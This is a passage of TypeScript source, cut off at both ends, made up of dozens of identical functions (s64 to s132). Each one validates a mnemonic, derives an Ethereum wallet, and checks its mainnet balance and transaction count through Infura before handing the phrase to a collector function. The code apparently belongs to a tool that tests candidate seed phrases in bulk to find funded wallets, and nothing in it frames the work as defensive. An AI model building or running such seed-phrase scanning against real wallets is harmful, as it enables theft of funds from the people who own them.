    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s64(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s65(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s66(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s67(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s68(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s69(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s70(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s71(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s72(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s73(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s74(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s75(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s76(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s77(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s78(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s79(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s80(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s81(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s82(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s83(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s84(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s85(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s86(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s87(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s88(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s89(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s90(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s91(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s92(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s93(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s94(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s95(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s96(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s97(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s98(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s99(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s100(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s101(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s102(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s103(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s104(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s105(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s106(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s107(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s108(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s109(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s110(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s111(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s112(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s113(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s114(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s115(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s116(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s117(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s118(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s119(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s120(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s121(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s122(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s123(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s124(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s125(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s126(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s127(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s128(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s129(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s130(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s131(mnemonic: string, db: any, api: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider("mainnet", api); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s132(mnemonic: string, db: any, api: any): Promise<void> {
  try {
